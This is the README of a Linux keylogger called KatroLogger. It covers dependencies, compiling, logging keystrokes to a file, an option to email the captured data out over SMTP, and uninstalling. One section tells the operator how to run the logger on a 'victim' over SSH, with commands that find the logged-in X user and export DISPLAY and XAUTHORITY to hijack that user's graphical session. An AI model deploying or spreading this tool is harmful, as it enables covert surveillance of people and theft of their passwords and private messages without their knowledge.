# KatroLogger
KeyLogger for Linux Systems.

- **Dependencies**
  - curl
  - libx11-dev (Debian-Based)
  - libX11-devel (RHEL-Based)

- **Compiling**
```
./configure
make
make install
```
- **Usage**
```
katrologger --output /path/file
```
Send data by e-mail:
```
keylogger --smtp-help
```
- **Fixing problems accessing via SSH**
> when connecting to the victim remotely via ssh it will be necessary to export environment variables to run the keylogger.

For hosts without GUI:
```
# export GPG_TTY=$(tty)
```
For hosts with xorg running:
> identifying logged in user
```
# user=$(who | grep "(:0)" | awk '{print $1}')
# echo $user
```
> Exporting variables
```
# export DISPLAY=:0.0
# export XAUTHORITY=/home/$user/.Xauthority
```
- **Uninstall**
```
make uninstall
```
